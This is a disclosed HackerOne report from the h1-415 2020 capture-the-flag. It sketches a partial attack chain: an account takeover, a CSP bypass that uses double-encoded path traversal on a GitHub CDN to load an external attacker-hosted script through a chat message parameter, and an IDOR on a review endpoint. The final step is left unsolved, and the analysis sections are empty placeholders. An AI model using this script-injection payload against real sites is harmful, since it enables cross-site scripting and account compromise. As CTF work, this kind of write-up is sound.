---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '781265'
original_report_id: '781265'
title: '[h1-415 2020] Spent a week and failed at solving the last step.'
weakness: Improper Access Control - Generic
team_handle: h1-ctf
created_at: '2020-01-23T05:07:37.816Z'
disclosed_at: '2020-02-04T00:17:33.360Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 96
asset_identifier: h1-415.h1ctf.com
asset_type: URL
max_severity: none
tags:
- hackerone
- improper-access-control-generic
---

# [h1-415 2020] Spent a week and failed at solving the last step.

## Metadata

- HackerOne Report ID: 781265
- Weakness: Improper Access Control - Generic
- Program: h1-ctf
- Disclosed At: 2020-02-04T00:17:33.360Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

## Summary:

I found something interesting  with Headless chrome debugging in the last step, I am sure I am going to solve this after trying very hard for about a week, I don't know when this CTF is going to end, that's why I am submitting a summary of how to solve this so that I can write the full report after fully solving the final step.

1. ATO of jobert's account using jobert@mydocz.cosmic
2. CSP bypass using URL double encoding. `https://h1-415.h1ctf.com/support/chat?message=%3Cscript%20type=%22text/javascript%22%20src=%22https://raw.githack.com/mattboldt/typed.js/master/lib/typed.js/..%252f..%252f..%252f..%252f..%252fInvaders0/xss/81faa59004ebeee525502d38b302445be93a2131/as.js%22%3E%3C/script%3E`
3. IDOR to  update the name at review. ```http://localhost:3000/support/review/c9b46d365357148bcd2436bc5d7fc19f27268010e91cd271b6531f8dff6824dc```
4. Headless chrome debugging enabled (have to solve).

## Impact

.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
